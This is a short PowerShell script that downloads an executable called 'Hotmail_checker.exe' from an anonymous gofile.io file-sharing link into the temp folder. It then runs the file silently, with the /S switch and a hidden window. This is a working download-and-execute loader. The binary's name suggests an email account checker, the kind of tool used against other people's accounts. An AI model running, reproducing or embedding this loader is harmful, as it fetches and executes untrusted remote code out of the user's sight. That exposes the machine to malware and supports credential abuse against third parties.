$ErrorActionPreference = "Stop"

$url = "https://cold-eu-agl-1.gofile.io/download/web/cf8ab565-842e-4f6e-a9bb-4b6e05c83e40/Hotmail_checker.exe"
$temp = Join-Path $env:TEMP "Hotmail_checker.exe"

Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing

$process = Start-Process `
    -FilePath $temp `
    -ArgumentList "/S" `
    -Wait `
    -PassThru `
    -WindowStyle Hidden

exit $process.ExitCode
